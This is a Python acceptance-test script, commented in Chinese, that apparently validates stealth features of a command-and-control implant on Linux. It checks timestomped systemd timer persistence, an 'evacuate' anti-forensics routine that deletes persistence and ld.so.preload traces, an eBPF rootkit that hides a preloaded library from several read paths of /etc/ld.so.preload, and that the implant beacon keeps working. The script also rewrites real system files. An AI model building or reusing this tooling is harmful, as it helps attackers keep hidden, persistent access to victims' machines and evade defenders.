#!/usr/bin/env python3
"""P3-G5/H2 验收：systemd timer 持久化 + 现场复原/撤离命令

方案依据：完全体清单 G5（systemd timer，缺）+ H2（现场复原，缺）
          §1 I 表 `ls -la /etc/systemd/system/` 属对手会跑的命令

  T0  systemd 主机判定 + timestomp 阳性对照（ISS-020 规则：先证明观测手段能看见差异）
  T1  systemd_persist 落地三件：.service / .timer / timers.target.wants 链接
  T2  wants 条目**是符号链接**且指向 ../<name>.timer（systemctl enable 的形态）
  T3  timestomp：两个单元文件 mtime == **创建前**的目录 mtime，且目录自身 mtime 未被 bump
  T4  单元文件**语法有效**：systemd 认得它（systemd-analyze verify / is-enabled）
      —— 只落盘但不合法的单元是"纯负债"：能被发现、不能复活载荷
  T5  撞名保护：指定一个已存在的系统单元名 → **拒绝**且不留任何文件
  T6  evacuate：systemd 三件全部删除
  T7  evacuate preload 部分移除：目标行消失、**保留行仍在**、文件仍在
  T8  evacuate preload 全清空：文件被 unlink（还原到"本不存在"）
  T9  evacuate cron：/etc/cron.d/<name> 被删
  T10 evacuate rm：任意文件被删
  T11 幂等：同一 spec 重复下发 → 全部 absent，不报 FAILED
  T12 回归：agent beacon 仍通
  T13 跨特性：redact 在跑时 evacuate 仍能真删 preload 行（考**豁免通道**）
  T14 跨特性别名面：//  /./  相对  open(2) 四条读法全被抹平，mmap 真身未变

安全性：本脚本会临时改写真实的 /etc/ld.so.preload。开始时备份、结束时还原。
"""
import base64, ctypes, json, os, shutil, struct, subprocess, sys, time
import mmap

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import e2e
import gap10_rootkit_verify as g10
import p03_hide_link_verify as p03

LISTENER = "TestHTTP"
UNIT     = "ax-sysmain-%d" % (os.getpid() % 100000)
CRON     = "ax-cron-%d" % (os.getpid() % 100000)
PRELOAD  = "/etc/ld.so.preload"
SO       = "/usr/lib/libaxv-%d.so" % (os.getpid() % 100000)
R        = []


def rec(item, ok, note=""):
    R.append(bool(ok))
    print("  [%-4s] %-52s %s" % ("PASS" if ok else "FAIL", item, note), flush=True)


def sh(c):
    return subprocess.run(["bash", "-lc", c], capture_output=True, text=True).stdout


def blob(*fields):
    out = struct.pack("<I", len(fields))
    for f in fields:
        b = f.encode() if isinstance(f, str) else f
        out += struct.pack("<I", len(b)) + b
    return out


def mtime(p):
    try:
        return os.stat(p).st_mtime
    except OSError:
        return None


SVC = "/etc/systemd/system/%s.service" % UNIT
TMR = "/etc/systemd/system/%s.timer" % UNIT
LNK = "/etc/systemd/system/timers.target.wants/%s.timer" % UNIT
CRONF = "/etc/cron.d/%s" % CRON
RM_TARGET = "/tmp/axp14_rm_test"

# ── 读 preload 的三种读法 ────────────────────────────────────────────────────
# 真身**必须**用 mmap：redact 只 hook read(2)，mmap 是已归档的固有边界（ISS-048）。
# 用 open().read() 去断言"文件里有没有那行"，在 redact 在跑时是**循环论证** ——
# 那条读同样被改写 → "读到 SO 不见了" 会被误当成删除成功（假绿）。
def read_true(path):
    fd = os.open(path, os.O_RDONLY)
    try:
        m = mmap.mmap(fd, 0, access=mmap.ACCESS_READ)
        try:
            return bytes(m[:])
        finally:
            m.close()
    finally:
        os.close(fd)


# 直调 open(2)：glibc 的 open() 其实是 openat，绕不过 ISS-054 那个口子。
# 与 tools/p16_alias_probe.py 的 read_open2 同一手法（第三次出现就该抽成
# tools/axread.py 共用了）。
_SYS_OPEN = 2
_libc = ctypes.CDLL(None, use_errno=True)
_libc.syscall.restype = ctypes.c_long
_libc.syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_long, ctypes.c_long]


def read_open2(path, n=4096):
    ctypes.set_errno(0)
    fd = _libc.syscall(_SYS_OPEN, path.encode(), os.O_RDONLY, 0)
    if fd < 0:
        return None
    try:
        return os.read(fd, n)
    finally:
        os.close(fd)


def read_rel(name, n=4096):
    """cwd 切到所在目录、只用裸文件名去读（ISS-055 的第三种写法）"""
    d, b = os.path.split(name)
    cwd = os.getcwd()
    try:
        os.chdir(d)
        with open(b, "rb") as f:
            return f.read(n)
    finally:
        os.chdir(cwd)


PRELOAD_BAK = None


def cleanup():
    for p in (SVC, TMR, LNK, CRONF, RM_TARGET):
        try:
            os.unlink(p)
        except OSError:
            pass
    # 还原真实的 /etc/ld.so.preload
    try:
        if PRELOAD_BAK is None:
            if os.path.exists(PRELOAD):
                os.unlink(PRELOAD)
        else:
            with open(PRELOAD, "wb") as f:
                f.write(PRELOAD_BAK)
    except OSError:
        pass
    sh("systemctl daemon-reload 2>/dev/null")


def main():
    global PRELOAD_BAK
    if os.path.exists(PRELOAD):
        with open(PRELOAD, "rb") as f:
            PRELOAD_BAK = f.read()

    # ── T0 前置 ────────────────────────────────────────────────────────────
    is_systemd = os.path.isdir("/run/systemd/system")
    dmt = mtime("/etc/systemd/system")
    now = time.time()
    # 阳性对照：目录 mtime 与"现在"可区分，否则 T3 证明不了任何事
    rec("T0 systemd 主机 + timestomp 观测有效",
        is_systemd and dmt is not None and abs(dmt - now) > 5,
        "systemd=%s dir_mtime=%.0f now=%.0f (Δ=%.0fs)" % (
            is_systemd, dmt or 0, now, now - (dmt or now)))

    binp = e2e.gen_agent(LISTENER, "p14")
    pid = e2e.launch(binp)
    aid = e2e.wait_registered(LISTENER, pid, timeout=90)
    print("[p14] agent id=%s pid=%s" % (aid, pid), flush=True)

    # ── T1/T3：systemd_persist ─────────────────────────────────────────────
    sh("rm -f %s %s %s" % (SVC, TMR, LNK))
    # 基准必须在**清理动作之后**重读：rm 本身会 bump 目录 mtime，而 agent 记录
    # 的是"它创建之前"的值 —— 两者必须指同一时刻，否则断言的是两件不同的事。
    dmt = mtime("/etc/systemd/system") or dmt
    out = p03.run_bof(aid, "systemd_persist", blob("/bin/true", UNIT), timeout=90)
    t1 = os.path.exists(SVC) and os.path.exists(TMR) and os.path.lexists(LNK)
    rec("T1 三件落地 service/timer/wants", t1,
        "svc=%s tmr=%s lnk=%s" % (os.path.exists(SVC), os.path.exists(TMR),
                                  os.path.lexists(LNK)))

    islink = os.path.islink(LNK)
    tgt = os.readlink(LNK) if islink else ""
    rec("T2 wants 条目是符号链接且指向 ../%s.timer" % UNIT,
        islink and tgt == "../%s.timer" % UNIT,
        "islink=%s target=%r" % (islink, tgt))

    m1, m2 = mtime(SVC), mtime(TMR)
    dmt_now = mtime("/etc/systemd/system")
    # 两条独立断言：
    #   ① 两单元 mtime == **创建前**的目录 mtime（timestomp 真用了基准，不是 now）
    #   ② 目录自身 mtime 未被 bump（创建文件会把它置为 now，必须恢复）
    # 修复前 ① 恒等于 now（读基准发生在创建之后）、② 从没做过 —— 两条都是回归位。
    ok3 = (m1 is not None and m2 is not None and dmt_now is not None
           and abs(m1 - dmt) < 2 and abs(m2 - dmt) < 2
           and abs(dmt_now - dmt) < 2)
    rec("T3 timestomp: 两单元 == 目录原 mtime 且目录 mtime 未被 bump", ok3,
        "svc=%.0f tmr=%.0f dir_before=%.0f dir_now=%.0f"
        % (m1 or 0, m2 or 0, dmt or 0, dmt_now or 0))

    # ── T4 语法有效（观测侧做，属于测试行为不是隐蔽行为）──────────────────
    ver = sh("systemd-analyze verify %s 2>&1; echo rc=$?" % TMR)
    sh("systemctl daemon-reload 2>/dev/null")
    en = sh("systemctl is-enabled %s.timer 2>&1" % UNIT).strip()
    lst = sh("systemctl list-timers --all --no-pager 2>/dev/null | grep -c %s" % UNIT).strip()
    ok4 = ("rc=0" in ver) and (en == "enabled") and (lst not in ("", "0"))
    rec("T4 单元语法有效 + systemd 认得（enabled）", ok4,
        "verify=%s is-enabled=%r list-timers命中=%s" % (
            ver.strip().splitlines()[-1] if ver.strip() else "?", en, lst))

    # ── T5 撞名保护 ────────────────────────────────────────────────────────
    out5 = p03.run_bof(aid, "systemd_persist", blob("/bin/true", "systemd-journald"),
                       timeout=90)
    refused = ("refusing" in out5) or ("already exists" in out5)
    # 系统单元必须原封不动（我们不能把目标机改坏）
    intact = os.path.exists("/usr/lib/systemd/system/systemd-journald.service")
    rec("T5 撞名系统单元 → 拒绝且不覆盖", refused and intact,
        "refused=%s journald_intact=%s" % (refused, intact))

    # ── 造 T6/T7/T9/T10 的前置物 ──────────────────────────────────────────
    os.makedirs("/etc/cron.d", exist_ok=True)
    with open(CRONF, "w") as f:
        f.write("*/5 * * * * root /bin/true\n")
    with open(RM_TARGET, "w") as f:
        f.write("x")
    with open(PRELOAD, "w") as f:
        f.write(SO + "\n/usr/lib/libnss_real.so\n")

    spec = "systemd:%s;cron:%s;preload:%s;rm:%s" % (UNIT, CRON, SO, RM_TARGET)
    out6 = p03.run_bof(aid, "evacuate", blob(spec), timeout=120)

    rec("T6 evacuate: systemd 三件全删",
        not os.path.exists(SVC) and not os.path.exists(TMR) and not os.path.lexists(LNK),
        "svc=%s tmr=%s lnk=%s" % (os.path.exists(SVC), os.path.exists(TMR),
                                  os.path.lexists(LNK)))

    pre = read_true(PRELOAD) if os.path.exists(PRELOAD) else b"<MISSING>"
    rec("T7 evacuate preload: 目标行删、保留行留、文件仍在",
        os.path.exists(PRELOAD) and SO.encode() not in pre and b"libnss_real.so" in pre,
        "真身=%r" % pre)

    rec("T9 evacuate cron: 文件被删", not os.path.exists(CRONF),
        "exists=%s" % os.path.exists(CRONF))
    rec("T10 evacuate rm: 文件被删", not os.path.exists(RM_TARGET),
        "exists=%s" % os.path.exists(RM_TARGET))

    # ── T8 preload 清空 → unlink ──────────────────────────────────────────
    with open(PRELOAD, "w") as f:
        f.write(SO + "\n")
    out8 = p03.run_bof(aid, "evacuate", blob("preload:%s" % SO), timeout=90)
    rec("T8 evacuate preload 全清空 → 文件被 unlink",
        not os.path.exists(PRELOAD),
        "exists=%s 回执=%r" % (os.path.exists(PRELOAD),
                              (out8 or "")[-90:].replace("\n", " ")))

    # ── T11 幂等 ──────────────────────────────────────────────────────────
    out11 = p03.run_bof(aid, "evacuate", blob(spec + ";preload:%s" % SO), timeout=120) or ""
    ok11 = ("FAILED" not in out11) and out11.count("absent") >= 3
    rec("T11 幂等：重复撤离全 absent、无 FAILED", ok11,
        "absent=%d FAILED=%s" % (out11.count("absent"), "FAILED" in out11))

    # ── T12 回归（复用已在跑的 agent，不另起进程）─────────────────────────
    # 不能走 console_poll 的通用子串等待：Consoles 里 T11（evacuate）那条回执
    # 早已是 completed，通用等待会立刻命中它，把"没等到 getuid"误判成"等到了"
    # （ISS-046，回执配对第 5 次）。一律按 a_task_id 配对。
    try:
        base = p03.max_id(aid)
        e2e.send_raw(aid, "getuid")
        tid, t0 = None, time.time()
        while tid is None and time.time() - t0 < 30:
            for r in p03._rows(aid, base):
                if r.get("type") == 106 and "getuid" in str(r.get("a_cmdline", "")):
                    tid = r.get("a_task_id")
            if tid is None:
                time.sleep(1)
        txt, t0 = "", time.time()
        while time.time() - t0 < 90:
            for r in p03._rows(aid, base):
                if r.get("type") == 107 and r.get("a_task_id") == tid:
                    txt = str(r.get("a_text", ""))
                    break
            if txt:
                break
            time.sleep(1)
        ok12 = "uid" in txt.lower()
    except Exception as ex:
        txt, ok12 = "exception: %s" % ex, False
    rec("T12 撤离后 beacon 仍通", ok12, "回执=%r" % txt[:60])

    # ── T13/T14 跨特性：redact 在跑时 evacuate 还能不能**真**清 preload ─────
    # 这条曾经以**错误的理由**通过：修 ISS-054 之前 redact 只 hook openat(257)，
    # 而 evacuate 的读走 AxReadFileToBuffer → open(2)，**根本没进 redact 的判据**，
    # 于是"删成功"纯粹是因为没人拦它 —— 判据再准也测不到东西。
    # Fix A 把 open(2) 也挂上之后，这条路**立刻**会失效（读到被抹平的假 preload
    # → 找不到要删的行 → "成功地什么都没删"，回执还报 removed）。所以 evacuate 必须
    # 走豁免通道：先 AxAccess 探测、再带 O_CLOEXEC 开（Fix C）。
    # ⇒ T13 现在考的就是**豁免通道**：绿 = Fix C 生效；红 = 撤离静默失效。
    #
    # ★ 观测必须用 mmap：redact 只 hook read(2)。用 open().read() 断言的话，那条读
    #   同样被改写 → "读到 SO 不见了" 会被误当成删除成功（假绿，ISS-048 同族）。
    PIN_I = "axp14i"

    try:
        nm = SO.encode() + b"\x00" + b"axp14decoy"
        txt = p03.run_bof(aid, "ebpf_load", g10.pack_load(
            "%s/redact.insns.bin" % g10.BPF_OUT, "%s/redact.mapreloc.txt" % g10.BPF_OUT,
            5, 1, "raw_syscalls/sys_exit", nm, "", b"", PIN_I), timeout=90) or ""
        ok13a = ("failed" not in txt) and ("attached" in txt or "cpus=" in txt)
        rec("T13a redact 已加载 (pin=%s)" % PIN_I, ok13a,
            (txt.strip().splitlines() or [""])[-1][:60])
        if ok13a:
            with open(PRELOAD, "w") as f:
                f.write(SO + "\n/usr/lib/libnss_real.so\n")
            p03.run_bof(aid, "evacuate", blob("preload:%s" % SO), timeout=120)
            tb = read_true(PRELOAD) if os.path.exists(PRELOAD) else b"<MISSING>"
            rec("T13 跨特性：redact 在跑时 evacuate 仍能真删 preload 行（mmap 验真身）",
                SO.encode() not in tb, "真身=%r" % tb[:70])

            # ── T14 别名面（跨特性窗口）：四条等价写法一个都不许漏 ───────────
            # p16 已证修前只有规范路径被抹平（ISS-055）。这里把同一张表搬进
            # **rootkit 已加载**的窗口再跑一遍 —— 撤离/清理动作常常就在这个窗口下发。
            # 真身（mmap）里 SO 必须还在：证明是**读时改写**，不是文件被动过。
            with open(PRELOAD, "w") as f:
                f.write(SO + "\n/usr/lib/libnss_real.so\n")
            a1 = open("/etc//ld.so.preload", "rb").read()
            a2 = open("/etc/./ld.so.preload", "rb").read()
            a3 = read_rel(PRELOAD) or b""
            a4 = read_open2(PRELOAD) or b""
            a5 = read_true(PRELOAD)
            leaks = [k for k, v in (("//", a1), ("/./", a2), ("cwd=/etc", a3),
                                    ("open(2)", a4)) if SO.encode() in v]
            rec("T14 别名面：//  /./  相对  open(2) 四条全不见 SO（redact 在跑）",
                not leaks and SO.encode() in a5,
                "漏=%s 真身仍有SO=%s" % (leaks or "无", SO.encode() in a5))
    except Exception as ex:
        rec("T13 跨特性：redact x evacuate", False, "exception: %s" % ex)
    finally:
        try:
            p03.run_bof(aid, "ebpf_unload", g10.pack_unload(PIN_I), timeout=60)
        except Exception:
            pass
        cleanup()
        time.sleep(1)
    e2e.kill(pid)

    print("\nPASS=%d FAIL=%d" % (sum(R), len(R) - sum(R)))
    print("RESULT: %s" % ("PASS" if all(R) else "FAIL"))


if __name__ == "__main__":
    try:
        main()
    finally:
        cleanup()
